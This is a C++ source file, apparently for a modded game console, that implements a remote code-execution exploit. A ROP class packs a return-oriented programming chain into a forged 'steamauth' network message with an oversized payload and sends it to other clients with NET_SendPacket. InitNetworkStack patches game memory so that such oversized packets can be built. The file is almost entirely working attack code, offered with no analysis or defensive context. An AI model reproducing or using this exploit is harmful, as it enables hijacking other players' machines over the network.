#include "main.h"

opd_s MSG_Init_s = { 0x0032A684, TOC };
opd_s MSG_WriteByte_s = { 0x0032AC54, TOC };
opd_s MSG_WriteLong_s = { 0x0032EE34, TOC };
opd_s MSG_WriteShort_s = { 0x0032EDC0, TOC };
opd_s MSG_WriteString_s = { 0x0032B464, TOC };
opd_s MSG_WriteData_s = { 0x0032AC8C, TOC };
opd_s NET_SendPacket_s = { 0x00463318, TOC };
opd_s MSG_WriteInt64_s = { 0x0032B3F4, TOC };
opd_s Com_LocalClient_GetNetworkID_s = { 0x00317124, TOC };

int(*MSG_WriteString)(msg_t* msg, const char* value) = (int(*)(msg_t*, const char* value))&MSG_WriteString_s;
int(*MSG_WriteInt64)(msg_t* msg, long long value) = (int(*)(msg_t*, long long value))&MSG_WriteInt64_s;
int(*MSG_Init)(msg_t* msg, char* buffer, int size) = (int(*)(msg_t*, char*, int))&MSG_Init_s;
int(*MSG_WriteByte)(msg_t* msg, int value) = (int(*)(msg_t*, int))&MSG_WriteByte_s;
int(*MSG_WriteLong)(msg_t* msg, int value) = (int(*)(msg_t*, int))&MSG_WriteLong_s;
int(*MSG_WriteShort)(msg_t* msg, int value) = (int(*)(msg_t*, int))&MSG_WriteShort_s;
int(*MSG_WriteData)(msg_t* msg, unsigned char* data, int size) = (int(*)(msg_t*, unsigned char*, int))&MSG_WriteData_s;
int(*NET_SendPacket)(int, int, char*, unsigned long long, unsigned long long, unsigned long long) = (int(*)(int, int, char*, unsigned long long, unsigned long long, unsigned long long))&NET_SendPacket_s;
int(*Com_LocalClient_GetNetworkID)(int queue) = (int(*)(int))&Com_LocalClient_GetNetworkID_s;

unsigned short LittleShort(unsigned short x)
{
	return (unsigned short)((x >> 8) | (x << 8));
}

unsigned int LittleLong(unsigned int x)
{
	return (unsigned int)(
		(x >> 24)
		| ((x >> 8) & 0xff00)
		| ((x << 8) & 0xff0000)
		| (x << 24));
}


ROP::ROP()
{
	this->MessageBuffer = NULL;
	this->ropchainData = NULL;

	this->MessageBuffer = new unsigned char[0x1000];
}

ROP::~ROP()
{
	if (this->MessageBuffer)
	{
		delete this->MessageBuffer;
		this->MessageBuffer = NULL;
	}
}


void ROP::ClearChain()
{
	if (this->ropchainData)
	{
		delete this->ropchainData;
		this->ropchainData = NULL;
	}
	stack.clear();
}

void ROP::SetUpChain()
{
	MSG_Init(&this->ExploitMessage, (char*)this->MessageBuffer, 0x1000);
	MSG_WriteLong(&this->ExploitMessage, 0xFFFFFFFF);
	MSG_WriteString(&this->ExploitMessage, "steamauth");
	MSG_WriteInt64(&this->ExploitMessage, 0xAAAAAAAAAAAAAAAA);
}

void ROP::Push(unsigned int Address)
{
	stack.push_back(Address);
}

void ROP::ExecuteChain(unsigned char* Data, unsigned int Size)
{
	netchan_t* netchan = (netchan_t*)(*(int*)(0xD689DC) + 0x24354); //0x2CB38060

	int ExploitBufferSize = 0x800 + (stack.size() * 0x4);

	MSG_WriteShort(&this->ExploitMessage, ExploitBufferSize);

	this->ropchainData = new unsigned char[ExploitBufferSize];
	memset(this->ropchainData, 0x0, ExploitBufferSize);

	if (Data)
		memcpy(this->ropchainData, Data, Size);

	int* Chain = (int*)(ropchainData + 0x800);

	for (int i = 0; i < stack.size(); i++)
		Chain[i] = LittleLong(stack[i]);

	MSG_WriteData(&this->ExploitMessage, (unsigned char*)ropchainData, ExploitBufferSize);

	unsigned long long a = netchan->unk3;

	a = (a << 32);

	NET_SendPacket(Com_LocalClient_GetNetworkID(0), this->ExploitMessage.cursize, this->ExploitMessage.data, netchan->unk1, netchan->unk2, a);

}

void InitNetworkStack()
{
	//stack
	*(int*)0x00463318 = 0xF821E101;
	*(int*)0x00463554 = 0x38211F00;

	//link
	*(int*)0x00463320 = 0xF8011F10;
	*(int*)0x00463524 = 0xE8011F10;

	//gplr
	*(int*)0x00463324 = 0xFB011EB0;
	*(int*)0x0046332C = 0xFB211EB8;
	*(int*)0x00463328 = 0xFB411EC0;
	*(int*)0x00463338 = 0xFBA11ED8;
	*(int*)0x00463340 = 0xFAE11EA8;
	*(int*)0x0046334C = 0xFB811ED0;
	*(int*)0x00463358 = 0xFBE11EE8;
	*(int*)0x0046335C = 0xFB611EC8;
	*(int*)0x00463368 = 0xFBC11EE0;
	*(int*)0x0046337C = 0xFAC11EA0;

	*(int*)0x0046352C = 0xEAC11EA0;
	*(int*)0x00463530 = 0xEAE11EA8;
	*(int*)0x00463534 = 0xEB011EB0;
	*(int*)0x00463538 = 0xEB211EB8;
	*(int*)0x0046353C = 0xEB411EC0;
	*(int*)0x00463540 = 0xEB611EC8;
	*(int*)0x00463544 = 0xEB811ED0;
	*(int*)0x00463548 = 0xEBA11ED8;
	*(int*)0x0046354C = 0xEBC11EE0;
	*(int*)0x00463550 = 0xEBE11EE8;

	//stack
	*(int*)0x00198380 = 0xF821E101;
	*(int*)0x00198664 = 0x38211F00;

	//link
	*(int*)0x00198388 = 0xF8011F10;
	*(int*)0x00198644 = 0xE8011F10;

	//gplr
	*(int*)0x0019838C = 0xFBE11E98;
	*(int*)0x00198398 = 0xFBC11E90;
	*(int*)0x001983A8 = 0xFBA11E88;
	*(int*)0x001983C0 = 0xFB811E80;
	*(int*)0x001983C4 = 0xFB611E78;
	*(int*)0x001983C8 = 0xFB411E70;

	*(int*)0x0019864C = 0xEB411E70;
	*(int*)0x00198650 = 0xEB611E78;
	*(int*)0x00198654 = 0xEB811E80;
	*(int*)0x00198658 = 0xEBA11E88;
	*(int*)0x0019865C = 0xEBC11E90;
	*(int*)0x00198660 = 0xEBE11E98;


	//stack
	*(int*)0x007F6CA4 = 0xF821E101;
	*(int*)0x007F6FAC = 0x38211F00;

	//link
	*(int*)0x007F6CAC = 0xF8011F10;
	*(int*)0x007F6F88 = 0xE8011F10;

	//gplr
	*(int*)0x007F6CB0 = 0xFBE11ED8;
	*(int*)0x007F6CB8 = 0xFB811EC0;
	*(int*)0x007F6CC0 = 0xFB611EB8;
	*(int*)0x007F6CCC = 0xFBC11ED0;
	*(int*)0x007F6CD4 = 0xFBA11EC8;
	*(int*)0x007F6CDC = 0xFB411EB0;
	*(int*)0x007F6CE0 = 0xFB211EA8;

	*(int*)0x007F6F90 = 0xEB211EA8;
	*(int*)0x007F6F94 = 0xEB411EB0;
	*(int*)0x007F6F98 = 0xEB611EB8;
	*(int*)0x007F6F9C = 0xEB811EC0;
	*(int*)0x007F6FA0 = 0xEBA11EC8;
	*(int*)0x007F6FA4 = 0xEBC11ED0;
	*(int*)0x007F6FA8 = 0xEBE11ED8;


	//stack
	*(int*)0x007F9F14 = 0xF821E101;
	*(int*)0x007FA078 = 0x38211F00;

	//link
	*(int*)0x007F9F1C = 0xF8011F10;
	*(int*)0x007FA04C = 0xE8011F10;

	//gplr
	*(int*)0x007F9F20 = 0xFBC11EF0;
	*(int*)0x007F9F24 = 0xFB811EE0;
	*(int*)0x007F9F30 = 0xFBE11EF8;
	*(int*)0x007F9F38 = 0xFB411ED0;
	*(int*)0x007F9F44 = 0xFB611ED8;
	*(int*)0x007F9F50 = 0xFBA11EE8;
	*(int*)0x007F9F58 = 0xFB211EC8;
	*(int*)0x007F9F5C = 0xFB011EC0;
	*(int*)0x007F9F60 = 0xFAE11EB8;

	*(int*)0x007FA054 = 0xEAE11EB8;
	*(int*)0x007FA058 = 0xEB011EC0;
	*(int*)0x007FA05C = 0xEB211EC8;
	*(int*)0x007FA060 = 0xEB411ED0;
	*(int*)0x007FA064 = 0xEB611ED8;
	*(int*)0x007FA068 = 0xEB811EE0;
	*(int*)0x007FA06C = 0xEBA11EE8;
	*(int*)0x007FA070 = 0xEBC11EF0;
	*(int*)0x007FA074 = 0xEBE11EF8;

	*(int*)0x00334250 = 0x60000000;
	*(int*)0x004633B8 = 0x308109A8;
	*(int*)0x004633BC = 0x38A01000;
	*(int*)0x001984AC = 0x60000000;
	*(int*)0x007F9F74 = 0x60000000;
	*(int*)0x007F9FE0 = 0x38A01A08;

	*(int*)0x007F9F98 = 0x32E10AA0;
	*(int*)0x007FA000 = 0x30610AA0;
	*(int*)0x007F9FE4 = 0x30E10A98;
	*(int*)0x007FA010 = 0x80C10A98;
}


